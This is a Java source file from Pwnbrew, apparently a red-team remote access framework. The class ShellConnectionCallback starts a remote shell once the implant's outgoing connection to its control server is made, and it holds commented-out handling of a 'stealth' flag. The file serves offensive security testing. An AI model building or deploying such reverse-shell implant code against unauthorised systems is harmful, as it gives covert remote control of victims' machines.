/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/
package pwnbrew.network.shell;

import pwnbrew.ClientConfig;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.ConnectionCallback;
import pwnbrew.network.RegisterMessage;
import pwnbrew.network.control.messages.CreateShellAck;
import pwnbrew.selector.SocketChannelHandler;
import pwnbrew.utilities.ReconnectTimer;

/**
 *
 * @author Securifera
 */
public class ShellConnectionCallback extends ConnectionCallback{
    
    private final PortManager theManager;
    private final Shell theShell;

    //=====================================================================
    /**
     * 
     * @param serverIp
     * @param passedPort
     * @param passedManager 
     * @param passedShell 
     * @param passedTimer 
     */
    public ShellConnectionCallback( String serverIp, int passedPort, PortManager passedManager, Shell passedShell, ReconnectTimer passedTimer ) {
        super(serverIp, passedPort, passedTimer);
        theManager = passedManager;
        theShell = passedShell;
    }   

    //=====================================================================
    /**
     * 
     * @param theChannelId
     */
    @Override
    public void handleConnection( int theChannelId ) {
        
        //Call the parent class function first
        super.handleConnection(theChannelId);
        
        ClientPortRouter aPR = (ClientPortRouter) theManager.getPortRouter( socketPort );
        if(theChannelId != 0 ){
            
//            ClientConfig theConf = ClientConfig.getConfig();
//            byte stlth_val = 0;
//            if( theConf.useStealth() )
//                stlth_val = 1;   

            //Queue register message
//            RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, theChannelId);
//            DataManager.send(theManager, aMsg);
            
            //Send ack back to set channel id
            CreateShellAck retMsg = new CreateShellAck( theChannelId );
            retMsg.setDestHostId( theShell.getHostId() );
            DataManager.send(theManager, retMsg);

            //Set the channelId and start it
            theShell.setChannelId(theChannelId);
            theShell.start();                

            //Register the shell
            OutgoingConnectionManager aOCM = aPR.getConnectionManager();
            aOCM.setShell( theChannelId, theShell );
            
            //Notify the thread
            //theReconnectThread.beNotified();
            
            //Send & Receive message
//            SocketChannelHandler aSCH =  aPR.getConnectionManager().getSocketChannelHandler(theChannelId);
//            if( aSCH != null )
//                aSCH.signalSend();            

        }
    }
    
}
